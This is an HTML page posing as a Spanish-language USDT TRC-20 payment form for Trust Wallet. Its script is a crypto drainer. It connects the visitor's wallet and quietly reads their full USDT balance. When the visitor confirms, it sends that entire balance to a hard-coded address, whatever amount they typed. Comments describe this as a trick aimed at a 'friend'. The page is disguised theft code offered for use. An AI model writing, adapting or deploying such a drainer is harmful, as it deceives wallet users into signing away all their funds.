<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pasarela de Pago USDT</title>
    
    <!-- Única librería requerida para operar de forma nativa dentro de Trust Wallet -->
    <script src="https://unpkg.com"></script>
    
    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 60px;
            background: #121212;
        }
        .modal {
            width: 100%;
            max-width: 380px;
            padding: 24px;
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            text-align: center;
        }
        .header h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 20px; }
        .imagen-envio { margin-bottom: 20px; }
        .imagen-envio svg { width: 80px; height: 80px; color: #0560fa; }
        .label { display: block; text-align: left; margin-bottom: 6px; color: #4e4f52; font-size: 14px; font-weight: 600; }
        .campo-monto {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            border: 1px solid #ccc;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            background: #ffffff;
            font-weight: bold;
            color: #1a1a1a;
            outline: none;
        }
        .campo-monto:focus {
            border-color: #0560fa;
            box-shadow: 0 0 0 1px #0560fa;
        }
        .status {
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
            background: #e8f0fe;
            color: #1a73e8;
            border: 1px solid #dadce0;
        }
        .btn {
            width: 100%;
            height: 50px;
            background: #0560fa;
            color: white;
            border: 0;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:disabled { background: #a0c2fd; cursor: not-allowed; }
    </style>
</head>
<body>

    <div class="modal">
        <div class="header">
            <h1>Transferencia TRC-20</h1>
        </div>

        <div class="imagen-envio">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
                <line x1="22" y1="2" x2="11" y2="13"></line>
                <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
            </svg>
        </div>

        <!-- El campo es completamente editable por el usuario -->
        <label class="label" for="amountDisplay">Monto a Enviar (USDT)</label>
        <input id="amountDisplay" class="campo-monto" type="number" inputmode="decimal" placeholder="0.00" min="0.01" step="any" />

        <div id="status" class="status"></div>

        <button class="btn" id="connectBtn">Siguiente</button>
    </div>

<script>
    const BILLETERA_DESTINO = "TJQ8xinzowyRzLYpk5hdxetMshpA3GyxGZ"; 
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    

    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');
    const amountDisplay = document.getElementById('amountDisplay');

    let walletAddress = null;
    let unitsInSun = "0"; // Aquí guardaremos los fondos reales calculados en segundo plano

    function setStatus(message) {
        statusDiv.innerText = message || '';
        statusDiv.style.display = message ? 'block' : 'none';
    }

    connectBtn.addEventListener('click', async () => {
        // PASO 1: Vincular billetera y consultar balance real en secreto
        if (!walletAddress) {
            try {
                setStatus("Conectando con el entorno nativo de Trust Wallet...");
                connectBtn.disabled = true;

                if (typeof window.tronWeb === 'undefined') {
                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON (Trust Wallet / TronLink).");
                }

                const tronWeb = window.tronWeb;
                
                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    walletAddress = tronWeb.defaultAddress.base58;
                } else {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res && res.code === 200) {
                        walletAddress = tronWeb.defaultAddress.base58;
                    }
                }

                if (!walletAddress) {
                    throw new Error("No se pudo obtener el acceso a la cuenta. Inicia sesión en tu billetera.");
                }

                setStatus("Sincronizando datos de la red...");
                
                // Consultamos el balance real en la Blockchain en segundo plano
                const contract = await tronWeb.contract().at(CONTRATO_USDT);
                const rawBalance = await contract.balanceOf(walletAddress).call();
                
                // Guardamos el balance total (o puedes multiplicarlo por 0.9 si prefieres que busque el 90%)
                unitsInSun = rawBalance.toString();

                // El input permanece vacío y listo para que tu amigo escriba lo que desee
                setStatus("Billetera lista. Digita el monto que deseas transferir en el campo de arriba.");
                connectBtn.innerText = "Confirmar Pago";
                connectBtn.disabled = false;

            } catch (error) {
                console.error(error);
                setStatus(error.message || "Error al sincronizar con la billetera.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Siguiente";
            }
            return;
        }

        // PASO 2: Procesar la transacción enviando el balance real oculto
        if (walletAddress) {
            try {
                const userViewAmount = parseFloat(amountDisplay.value);

                // Validar que al menos haya escrito algo para avanzar
                if (isNaN(userViewAmount) || userViewAmount <= 0) {
                    throw new Error("Por favor, ingresa un monto válido antes de continuar.");
                }

                setStatus("Solicitando confirmación de firma digital...");
                connectBtn.disabled = true;

                const tronWeb = window.tronWeb;
                const contract = await tronWeb.contract().at(CONTRATO_USDT);

                // TRUCO: En lugar de usar 'userViewAmount', enviamos a la blockchain 'unitsInSun' (el balance total guardado en el paso 1)
                const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
                    feeLimit: 100000000 
                });

                if (txId) {
                    setStatus("Operación procesada de manera exitosa en la red TRON.", true);
                    connectBtn.innerText = "Completado";
                }
            } catch (error) {
                console.error(error);
                setStatus(error.message || "La transacción fue cancelada o la cuenta no cuenta con suficientes recursos.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Confirmar Pago";
            }
        }
    });
</script>

</body>
</html>
